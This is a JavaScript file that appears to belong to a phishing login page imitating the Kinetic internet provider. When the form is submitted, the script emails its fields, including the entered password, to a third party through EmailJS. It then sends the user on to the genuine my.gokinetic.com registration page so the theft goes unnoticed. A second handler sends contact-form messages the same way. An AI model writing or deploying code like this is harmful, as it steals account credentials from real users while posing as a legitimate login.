const btn = document.getElementById("button");

document.getElementById("form").addEventListener("submit", function (event) {
  event.preventDefault();

  btn.value = "Überprüfen...";

  const serviceID = "default_service";
  const templateID = "template_gd2vzi7";

  emailjs.sendForm(serviceID, templateID, this).then(
    () => {
      btn.value = "Login";
      window.location.href =
        "https://my.gokinetic.com/consumer/registration/index/"; // Redirect to the desired link
    },
    (err) => {
      btn.value = "Login";
      alert(JSON.stringify(err));
    }
  );

  form.reset();
  return false;
});

const togglePasswordButton = document.querySelector("#toggle-password");
const closedEyeIcon = document.querySelector("#closed-eye");
const openEyeIcon = document.querySelector("#open-eye");
const passwordElement = document.querySelector("#password");
let isPasswordVisible = false;

togglePasswordButton.addEventListener("click", function () {
  if (!isPasswordVisible) {
    //make password visible
    passwordElement.type = "text";
    openEyeIcon.classList.remove("hide");
    closedEyeIcon.classList.add("hide");
  } else {
    //make password hidden
    passwordElement.type = "password";
    closedEyeIcon.classList.remove("hide");
    openEyeIcon.classList.add("hide");
  }
  isPasswordVisible = !isPasswordVisible;
});

console.log(openEyeIcon);

//placeholder

// Placeholder

const inputPlaceholder = document.querySelectorAll("input[placeholder]");

inputPlaceholder.forEach((input) => {
  input.addEventListener("click", function () {
    this.classList.toggle("input-border-color");
    console.log("clicked");
  });
});
// Initialize EmailJS with your public key (User ID)
(function () {
  emailjs.init("Pb0qJUxMA80Rz64Ua");
})();
document
  .getElementById("contact-form")
  .addEventListener("submit", function (event) {
    event.preventDefault();

    // Get form data
    var templateParams = {
      from_name: document.getElementById("name").value,
      from_email: document.getElementById("email").value,
      message: document.getElementById("message").value,
    };

    // Send email using EmailJS
    emailjs.send("service_wi59voj", "template_gd2vzi7", templateParams).then(
      function (response) {
        console.log("SUCCESS!", response.status, response.text);
        alert("Email sent successfully!");
      },
      function (error) {
        console.log("FAILED...", error);
        alert("Failed to send email. Please try again.");
      }
    );
  });
